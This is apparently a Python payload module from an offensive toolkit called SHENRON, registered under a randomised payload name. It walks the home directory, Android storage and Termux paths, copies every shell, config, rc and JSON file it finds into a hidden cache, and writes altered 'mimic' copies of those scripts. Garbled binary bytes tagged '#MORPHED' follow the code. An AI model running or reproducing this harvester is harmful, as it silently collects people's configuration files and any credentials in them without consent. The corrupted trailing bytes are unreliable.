from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
# manifest_vampire.py - SHENRON Layer 4: Manifest Leech + Clone Engine

import os
import re
from pathlib import Path
import hashlib

SEARCH_PATHS = [
    Path.home(),
    Path.home() / "storage",
    Path("/data/data/com.termux/files/usr/etc/"),
    Path.home() / "bin"
]

VAMPIRE_DIR = Path.home() / ".shenron_manifest_cache"
VAMPIRE_DIR.mkdir(exist_ok=True, parents=True)

MIMIC_OUTPUT_DIR = VAMPIRE_DIR / "mimics"
MIMIC_OUTPUT_DIR.mkdir(exist_ok=True)

TARGET_EXTS = [".sh", ".conf", ".py", ".rc", ".bashrc", ".zshrc", ".json"]

def hash_file(fp):
    return hashlib.sha256(fp.read_bytes()).hexdigest()

def mimic_script(content):
    lines = content.strip().splitlines()
    mimic = []
    for line in lines:
        line = re.sub(r"\s*#.*", "", line)
        if re.match(r"^\s*$", line): continue
        if "echo" in line or "printf" in line:
            mimic.append('echo "[~] Simulated Output"')
        elif "rm" in line or "cp" in line or "mv" in line:
            mimic.append(": # command suppressed")
        else:
            mimic.append(":" if len(line) > 100 else line)
    return "\n".join(mimic)

def scan_and_leech():
    seen_hashes = set()
    for base in SEARCH_PATHS:
        for root, dirs, files in os.walk(base):
            for f in files:
                p = Path(root) / f
                if any(str(p).endswith(ext) for ext in TARGET_EXTS):
                    try:
                        content = p.read_text(errors="ignore")
                        h = hash_file(p)
                        if h in seen_hashes:
                            continue
                        seen_hashes.add(h)

                        out_file = VAMPIRE_DIR / f"{p.name.replace('/', '_')}.leech"
                        out_file.write_text(content)

                        mimic_out = MIMIC_OUTPUT_DIR / f"mimic_{p.name}"
                        mimic_out.write_text(mimic_script(content))

                        print(f"[+] Leeched & Mimicked: {p}")
                    except Exception as e:
                        print(f"[!] Failed on {p}: {e}")

@register_payload(name="manifest_vampire_Y7ie4i_EEN6st_pOh0Lg")
def main():
    print("[*] Starting manifest vampire crawl...")
    scan_and_leech()
    print(f"[âœ“] Leeching complete. Output in: {VAMPIRE_DIR}")

if __name__ == "__main__":
    main()

Ý\×<…š¢öÏ-~ƒ‡¨ÍŠ#œÞàŽ®¶ßÜŒ(#MORPHED

cÅ5‚_“+Ðz#MORPHED

|cšu8Á	NºfR_.xØª†Bö;'zh5ìùäç@;Úæ5t†šÈ¬Ï_Š#MORPHED
